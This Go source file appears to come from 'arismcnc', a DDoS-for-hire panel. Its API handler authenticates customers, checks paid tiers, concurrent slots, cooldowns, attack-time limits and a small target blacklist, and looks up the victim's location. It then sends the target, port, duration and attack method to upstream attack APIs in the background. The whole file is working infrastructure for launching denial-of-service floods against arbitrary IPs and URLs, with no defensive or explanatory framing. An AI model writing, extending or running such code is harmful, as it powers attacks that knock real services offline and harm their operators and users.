package managers

import (
	"arismcnc/database"
	"arismcnc/utils"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

func CheckVIPStatus(license, method string, db *database.Database) (bool, error) {
	userInfo := db.GetAccountInfo(license)
	methodConfig, err := getMethodConfig(method)
	if err != nil || methodConfig == nil {
		return false, nil
	}
	if methodConfig.Permission != nil && utils.HasVipPermission(method) {
		return userInfo.Vip == 1, nil
	}
	return true, nil
}

func CheckPrivateStatus(license, method string, db *database.Database) (bool, error) {
	userInfo := db.GetAccountInfo(license)
	methodConfig, err := getMethodConfig(method)
	if err != nil || methodConfig == nil {
		return false, nil
	}
	if methodConfig.Permission != nil && utils.HasPrivatePermission(method) {
		return userInfo.Private == 1, nil
	}
	return true, nil
}

// Global map of user locks
var userLocks sync.Map

func getUserLock(username string) *sync.Mutex {
	// Get or create a mutex for the user
	lock, _ := userLocks.LoadOrStore(username, &sync.Mutex{})
	return lock.(*sync.Mutex)
}

func processAttack(username, password, target, port, timeStr, method string, db *database.Database, config *utils.Config) (map[string]string, error) {
	user := db.GetAccountInfo(username)

	// Ensure only one request is processed at a time for the user
	userLock := getUserLock(username)
	userLock.Lock()
	defer userLock.Unlock()

	if user.ApiAccess != 1 {
		return nil, fmt.Errorf("API access is denied.")
	}
	if db.IsAccountExpired(username) {
		return nil, fmt.Errorf("Account has expired.")
	}
	if !config.Attacks_enabled && user.Admin != 1 {
		return nil, fmt.Errorf("Attacks are disabled.")
	}

	methodConfig, err := getMethodConfig(method)
	if err != nil || methodConfig == nil {
		return nil, fmt.Errorf("Method not found.")
	}
	if !isValidTarget(target) {
		return nil, fmt.Errorf("Invalid target format.")
	}

	currentAttacks := db.GetCurrentAttacksLength()
	if currentAttacks > config.Global_slots {
		return nil, fmt.Errorf("Global network slots (" + strconv.Itoa(config.Global_slots) + ") are currently in use.")
	}

	if cooldown := db.HowLongOnCooldown(username, user.Cooldown); cooldown > 0 {
		return nil, fmt.Errorf("Cooldown active (%d seconds left).", cooldown)
	}
	if user.Admin != 1 && config.Global_cooldown > 0 {
		if globalCooldown := db.HowLongOnGlobalCooldown(config.Global_cooldown); globalCooldown > 0 {
			return nil, fmt.Errorf("Global cooldown active (%d seconds left).", globalCooldown)
		}
	}
	if db.GetUserCurrentAttacksCount(username) >= user.Concurrents {
		return nil, fmt.Errorf("All concurrent attack slots are in use.")
	}
	if user.PowerSaving != 1 && db.IsTargetCurrentlyUnderAttack(target) {
		return nil, fmt.Errorf("Target is already under attack.")
	}
	if user.BypassSpam != 1 && db.IsSpamming(username) {
		return nil, fmt.Errorf("Spam protection active. Please wait.")
	}
	if user.BypassBlacklist != 1 {
		if blocked, err := isTargetBlocked(target); blocked || err != nil {
			lm, err := NewLogManager("./assets/logs/logs.json")
			if err != nil {
				fmt.Println("Error initializing LogManager:", err)
				os.Exit(1)
			}
			defer lm.Close()

			lm.Log("User tried to attack blocked target (API)!\nUsername: " + username + "\nTarget: " + target + "\nPort: " + port + "\nTime: " + timeStr + "\nMethod: " + method + "\n----------------------")
			return nil, fmt.Errorf("Target is blocked.")
		}
	}

	timeInt, err := strconv.Atoi(timeStr)
	if err != nil {
		return nil, fmt.Errorf("Invalid time format: %s", timeStr)
	}
	if timeInt > user.Maxtime {
		return nil, fmt.Errorf("Your max attack time is %d.", user.Maxtime)
	}

	if valid, err := CheckVIPStatus(username, method, db); !valid || err != nil {
		return nil, fmt.Errorf("VIP access required for this method.")
	}
	if valid, err := CheckPrivateStatus(username, method, db); !valid || err != nil {
		return nil, fmt.Errorf("PRIVATE access required for this method.")
	}

	asnInfo := fetchASNInfo(target)
	lm, err := NewLogManager("./assets/logs/logs.json")
	if err != nil {
		fmt.Println("Error initializing LogManager:", err)
		os.Exit(1)
	}
	defer lm.Close()
	lm.Log("New Attack (API)!\nUsername: " + username + "\nTarget: " + target + "\nPort: " + port + "\nTime: " + timeStr + "\nMethod: " + method + "\n----------------------")
	db.LogAttack(username, target, port, parseTime(timeStr), method)

	// Send immediate response
	response := map[string]string{
		"\nerror":                "false",
		"\nmessage":              "Attack Sent",
		"\ntarget":               target,
		"\nmethod":               method,
		"\ntarget_country":       asnInfo.Country,
		"\ntarget_region":        asnInfo.Region,
		"\ntarget_org":           asnInfo.Org,
		"\nyour_running_attacks": fmt.Sprintf("%d/%d", db.GetUserCurrentAttacksCount(username), user.Concurrents),
	}

	// Process further actions in the background
	go func() {
		responses := make(chan string, len(methodConfig.API)) // Channel for goroutine synchronization
		var wg sync.WaitGroup                                 // WaitGroup to monitor goroutines

		for _, api := range methodConfig.API {
			fullURL := replacePlaceholdersFunnel(api, username, password, target, port, timeStr, method)

			wg.Add(1) // Add to WaitGroup counter
			go func(link string) {
				defer wg.Done() // Decrease WaitGroup counter when goroutine finishes
				res, err := http.Get(link)
				if err != nil {
					log.Printf("[ATTACK] Error sending request to: %s - %v", link, err)
					responses <- fmt.Sprintf("[ATTACK] %s response: error", link)
					return
				}
				defer res.Body.Close()

				body, err := io.ReadAll(res.Body)
				if err != nil {
					log.Printf("[ATTACK] Error reading response from: %s - %v", link, err)
					responses <- fmt.Sprintf("[ATTACK] %s response: read error", link)
					return
				}

				log.Printf("[ATTACK] Sending request to: %s", link)
				responses <- fmt.Sprintf("[ATTACK] %s response: %s", link, string(body))
			}(fullURL)
		}

		// Wait for all goroutines to finish
		wg.Wait()
		close(responses)

		for resp := range responses {
			log.Println(resp)
		}
	}()

	return response, nil
}

func FunnelCreate(w http.ResponseWriter, r *http.Request, db *database.Database, config *utils.Config) {
	if r.Method != http.MethodGet {
		respondWithJSON(w, true, "Invalid request method.")
		return
	}

	params := r.URL.Query()
	username, password := params.Get("username"), params.Get("password")
	target, port, timeStr, method := params.Get("target"), params.Get("port"), params.Get("time"), params.Get("method")

	if username == "" || password == "" || target == "" || port == "" || timeStr == "" || method == "" {
		respondWithJSON(w, true, "Missing required parameters.")
		return
	}
	if !db.AuthenticateUser(username, password) {
		respondWithJSON(w, true, "Invalid credentials.")
		return
	}

	response, err := processAttack(username, password, target, port, timeStr, method, db, config)
	if err != nil {
		respondWithJSON(w, true, err.Error())
		return
	}

	respondWithJSON(w, false, response)
}

func fetchASNInfo(target string) (asnInfo struct{ Country, Org, Region string }) {
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get("https://ipinfo.io/" + target + "/json?token=YOUR_IPINFO_TOKEN")
	if err != nil {
		log.Printf("Error fetching ASN info: %s", err)
		return
	}
	defer resp.Body.Close()
	json.NewDecoder(resp.Body).Decode(&asnInfo)
	return
}

func respondWithJSON(w http.ResponseWriter, isError bool, message interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"error":   isError,
		"message": message,
	})
}

func getMethodConfig(method string) (*utils.Method, error) {
	return utils.GetMethodConfig(method)
}

func parseTime(timeStr string) int {
	timeInt, err := strconv.Atoi(timeStr)
	if err != nil {
		log.Printf("Error parsing time: %s", err)
		return 0
	}
	return timeInt
}

func replacePlaceholdersFunnel(url, username, password, target, port, time, method string) string {
	replacements := map[string]string{
		"<<$host>>":   target,
		"<<$port>>":   port,
		"<<$time>>":   time,
		"<<$method>>": method,
	}
	for placeholder, value := range replacements {
		url = strings.ReplaceAll(url, placeholder, value)
	}
	return url
}

func sendRequest(url string) error {
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error sending request to %s: %s", url, err)
		return nil
	}
	defer resp.Body.Close()
	log.Printf("Request sent to %s, status code: %d", url, resp.StatusCode)
	return nil
}

func isTargetBlocked(target string) (bool, error) {
	blockedIPs, err := readBlacklistedIPs("assets/blacklists/list.json")
	if err != nil {
		return false, err
	}
	for _, blockedIP := range blockedIPs {
		if target == blockedIP || (strings.HasSuffix(blockedIP, ".gov") && strings.HasSuffix(target, ".gov")) {
			return true, nil
		}
	}
	return false, nil
}

func readBlacklistedIPs(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var ips []string
	if err := json.NewDecoder(file).Decode(&ips); err != nil {
		return nil, err
	}
	return ips, nil
}

func isValidTarget(target string) bool {
	if net.ParseIP(target) != nil {
		return true
	}
	regex := `^(http://|https://|www\.).+`
	matched, _ := regexp.MatchString(regex, target)
	return matched
}
